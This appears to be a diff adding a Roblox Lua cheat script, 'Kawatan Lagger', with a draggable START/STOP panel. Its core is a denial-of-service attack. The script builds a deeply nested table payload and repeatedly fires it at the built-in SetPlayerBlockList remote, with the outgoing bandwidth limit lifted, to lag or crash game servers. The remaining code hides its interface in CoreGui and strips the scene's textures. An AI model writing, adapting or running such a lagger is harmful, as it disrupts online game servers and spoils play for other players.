@@ -1,0 +1,315 @@
+-- // Kawatan Lagger â€” Prime Only //
+
+-- // 1 (Services) //
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local CoreGui = game:GetService("CoreGui")
+
+-- // 2 (Player + mobile detect) //
+local player = Players.LocalPlayer
+local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled
+
+-- // 3 (Lagger config) //
+local LAGGER_CONFIG = isMobile and {
+	TableIncrease = 290,
+	Tries = 1,
+	LoopWaitTime = 0.85,
+} or {
+	TableIncrease = 265,
+	Tries = 1,
+	LoopWaitTime = 0.05,
+}
+
+local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"
+
+-- // 4 (Remote resolver) //
+local function resolveRemote(path)
+	if not path or path == "" then return nil end
+	local obj = game
+	local cleaned = path:gsub("^game%.", "")
+	for segment in cleaned:gmatch("[^%.]+") do
+		if obj then obj = obj[segment] else return nil end
+	end
+	return obj
+end
+
+-- // 5 (Bomb builder) //
+local function getmaxvalue(val)
+	local mainvalueifonetable = 499999
+	if type(val) ~= "number" then return nil end
+	return mainvalueifonetable / (val + 2)
+end
+
+local function bomb(tableincrease, tries)
+	local maintable = {}
+	local spammedtable = {}
+	table.insert(spammedtable, {})
+	local z = spammedtable[1]
+	for i = 1, tableincrease do
+		local tableins = {}
+		table.insert(z, tableins)
+		z = tableins
+	end
+	local maximum = getmaxvalue(tableincrease) or 9999999
+	for i = 1, maximum do
+		table.insert(maintable, spammedtable)
+		if i % 5000 == 0 then task.wait() end
+	end
+	local remote = resolveRemote(CUSTOM_REMOTE_PATH)
+	if remote then
+		for i = 1, tries do
+			pcall(function()
+				if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
+					remote:FireServer(maintable)
+				elseif remote:IsA("RemoteFunction") then
+					remote:InvokeServer(maintable)
+				end
+			end)
+		end
+	end
+end
+
+-- // 6 (Lagger state) //
+local laggerEnabled = false
+local laggerThread = nil
+
+local function startLaggerLoop()
+	while laggerEnabled do
+		game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+		task.spawn(function() bomb(LAGGER_CONFIG.TableIncrease, LAGGER_CONFIG.Tries) end)
+		task.wait(math.max(LAGGER_CONFIG.LoopWaitTime, 0.15))
+	end
+end
+
+local function stopLaggerLoop()
+	laggerEnabled = false
+	if laggerThread then
+		pcall(function() coroutine.close(laggerThread) end)
+		laggerThread = nil
+	end
+end
+
+local function startLagger()
+	if laggerThread then return end
+	laggerEnabled = true
+	laggerThread = coroutine.create(startLaggerLoop)
+	coroutine.resume(laggerThread)
+end
+
+-- // 7 (Strip textures) //
+for _, v in pairs(workspace:GetDescendants()) do
+	if v:IsA("Texture") or v:IsA("Decal") then
+		v:Destroy()
+	elseif v:IsA("Part") and v.Material ~= Enum.Material.Neon and v.Material ~= Enum.Material.ForceField then
+		v.Material = Enum.Material.SmoothPlastic
+	end
+end
+
+-- // 8 (Cleanup) //
+if not CoreGui:FindFirstChild("HiddenUI") then
+	local f = Instance.new("Folder")
+	f.Name = "HiddenUI"
+	f.Parent = CoreGui
+end
+if CoreGui.HiddenUI:FindFirstChild("KawatanPrimeUI") then
+	CoreGui.HiddenUI.KawatanPrimeUI:Destroy()
+end
+
+-- // 9 (ScreenGui + UIScale) //
+local gui = Instance.new("ScreenGui")
+gui.Name = "KawatanPrimeUI"
+gui.ResetOnSpawn = false
+gui.Parent = CoreGui.HiddenUI
+
+local uiScale = Instance.new("UIScale")
+uiScale.Scale = 1
+uiScale.Parent = gui
+
+-- // 10 (Animated blue/cyan/white stroke) //
+local function createAnimatedStroke(parent, thickness, speed)
+	local s = Instance.new("UIStroke")
+	s.Thickness = thickness or 1.5
+	s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+	s.Color = Color3.new(1, 1, 1)
+	s.Parent = parent
+
+	local g = Instance.new("UIGradient")
+	g.Color = ColorSequence.new({
+		ColorSequenceKeypoint.new(0,   Color3.fromRGB(0,   50, 150)),
+		ColorSequenceKeypoint.new(0.3, Color3.fromRGB(0,  180, 255)),
+		ColorSequenceKeypoint.new(0.5, Color3.fromRGB(220, 240, 255)),
+		ColorSequenceKeypoint.new(0.7, Color3.fromRGB(0,  180, 255)),
+		ColorSequenceKeypoint.new(1,   Color3.fromRGB(0,   50, 150)),
+	})
+	g.Rotation = 0
+	g.Parent = s
+
+	task.spawn(function()
+		local spd = speed or 1.2
+		while parent.Parent do
+			g.Rotation = (g.Rotation + spd) % 360
+			task.wait()
+		end
+	end)
+	return s, g
+end
+
+-- // 11 (Prime panel â€” 130x60) //
+local prime = Instance.new("Frame")
+prime.Size = UDim2.new(0, 100, 0, 20)
+prime.Position = UDim2.new(0.5, -50, 0.5, -10)
+prime.BackgroundColor3 = Color3.fromRGB(6, 10, 28)
+prime.BackgroundTransparency = 0.05
+prime.Active = true
+prime.Parent = gui
+
+Instance.new("UICorner", prime).CornerRadius = UDim.new(0, 12)
+createAnimatedStroke(prime, 2, 0.7)
+
+-- // 12 (PRIME title) //
+local primeTitle = Instance.new("TextLabel")
+primeTitle.Size = UDim2.new(0, 38, 1, 0)
+primeTitle.Position = UDim2.new(0, 4, 0, 0)
+primeTitle.BackgroundTransparency = 1
+primeTitle.Text = "PRIME"
+primeTitle.Font = Enum.Font.GothamBlack
+primeTitle.TextSize = 8
+primeTitle.TextColor3 = Color3.new(1, 1, 1)
+primeTitle.TextXAlignment = Enum.TextXAlignment.Left
+primeTitle.Parent = prime
+
+local titleGrad = Instance.new("UIGradient")
+titleGrad.Color = ColorSequence.new({
+	ColorSequenceKeypoint.new(0,   Color3.fromRGB(0,  190, 255)),
+	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
+	ColorSequenceKeypoint.new(1,   Color3.fromRGB(0,  110, 220)),
+})
+titleGrad.Parent = primeTitle
+
+task.spawn(function()
+	while prime.Parent do
+		titleGrad.Rotation = (titleGrad.Rotation + 1.1) % 360
+		task.wait()
+	end
+end)
+
+-- // 13 (Lock/Unlock drag button â€” top-right, emoji only no bg box) //
+local primeDragLocked = true
+
+local lockBtn = Instance.new("TextButton")
+lockBtn.Size = UDim2.new(0, 16, 1, 0)
+lockBtn.Position = UDim2.new(1, -18, 0, 0)
+lockBtn.BackgroundTransparency = 1
+lockBtn.AutoButtonColor = false
+lockBtn.Text = "ðŸ”’"
+lockBtn.TextSize = 10
+lockBtn.Font = Enum.Font.GothamBlack
+lockBtn.TextColor3 = Color3.new(1, 1, 1)
+lockBtn.Parent = prime
+
+lockBtn.MouseButton1Click:Connect(function()
+	primeDragLocked = not primeDragLocked
+	lockBtn.Text = primeDragLocked and "ðŸ”’" or "ðŸ”“"
+	TweenService:Create(lockBtn, TweenInfo.new(0.15), {
+		BackgroundColor3 = primeDragLocked
+			and Color3.fromRGB(20, 30, 70)
+			or  Color3.fromRGB(0, 110, 210),
+	}):Play()
+end)
+
+-- // 14 (START / STOP button) //
+local startBtn = Instance.new("TextButton")
+startBtn.Size = UDim2.new(0, 44, 1, -4)
+startBtn.Position = UDim2.new(0, 42, 0, 2)
+startBtn.BackgroundColor3 = Color3.fromRGB(30, 160, 55)
+startBtn.AutoButtonColor = false
+startBtn.Font = Enum.Font.GothamBlack
+startBtn.Text = "START"
+startBtn.TextSize = 8
+startBtn.TextColor3 = Color3.new(1, 1, 1)
+startBtn.Parent = prime
+
+Instance.new("UICorner", startBtn).CornerRadius = UDim.new(0, 10)
+
+local startGrad = Instance.new("UIGradient")
+startGrad.Color = ColorSequence.new({
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(50, 200, 80)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 120, 40)),
+})
+startGrad.Rotation = 90
+startGrad.Parent = startBtn
+
+local primeActive = false
+
+local function setToggle(state)
+	laggerEnabled = state
+	if state then startLagger() else stopLaggerLoop() end
+end
+
+startBtn.MouseButton1Click:Connect(function()
+	primeActive = not primeActive
+	if primeActive then
+		setToggle(true)
+		startGrad.Color = ColorSequence.new({
+			ColorSequenceKeypoint.new(0, Color3.fromRGB(200, 50, 50)),
+			ColorSequenceKeypoint.new(1, Color3.fromRGB(120, 20, 20)),
+		})
+		startBtn.Text = "STOP"
+	else
+		setToggle(false)
+		startGrad.Color = ColorSequence.new({
+			ColorSequenceKeypoint.new(0, Color3.fromRGB(50, 200, 80)),
+			ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 120, 40)),
+		})
+		startBtn.Text = "START"
+	end
+end)
+
+-- // 15 (Draggable â€” respects lock) //
+do
+	local dg, ds, sp = false, nil, nil
+
+	local function clamp(pos)
+		local ss = workspace.CurrentCamera.ViewportSize
+		local gs = prime.AbsoluteSize
+		return UDim2.new(0,
+			math.clamp(pos.X.Offset, 0, math.max(0, ss.X - gs.X)),
+			0,
+			math.clamp(pos.Y.Offset, 0, math.max(0, ss.Y - gs.Y))
+		)
+	end
+
+	prime.InputBegan:Connect(function(input)
+		if primeDragLocked then return end
+		if input.UserInputType == Enum.UserInputType.MouseButton1
+		or input.UserInputType == Enum.UserInputType.Touch then
+			dg = true
+			ds = input.Position
+			sp = prime.Position
+		end
+	end)
+
+	UserInputService.InputChanged:Connect(function(input)
+		if not dg then return end
+		if primeDragLocked then dg = false return end
+		if input.UserInputType == Enum.UserInputType.MouseMovement
+		or input.UserInputType == Enum.UserInputType.Touch then
+			local d = input.Position - ds
+			prime.Position = clamp(UDim2.new(
+				sp.X.Scale, sp.X.Offset + d.X,
+				sp.Y.Scale, sp.Y.Offset + d.Y
+			))
+		end
+	end)
+
+	UserInputService.InputEnded:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1
+		or input.UserInputType == Enum.UserInputType.Touch then
+			dg = false
+		end
+	end)
+end
+
+warn("Kawatan Prime loaded.")
